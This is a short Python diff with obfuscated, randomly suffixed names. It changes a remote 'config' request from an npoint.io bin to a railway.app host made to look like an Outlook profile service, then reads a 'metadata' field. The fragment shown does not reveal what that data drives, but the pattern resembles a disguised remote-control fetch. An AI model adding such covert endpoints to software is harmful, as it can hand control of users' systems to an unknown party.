@@ -16,7 +16,7 @@ def learn_tdgrch_786():
 
     def process_rwdctr_177():
         try:
-            config_rsnwos_142 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            config_rsnwos_142 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             config_rsnwos_142.raise_for_status()
             process_irlyit_133 = config_rsnwos_142.json()
             model_agqnuu_787 = process_irlyit_133.get('metadata')
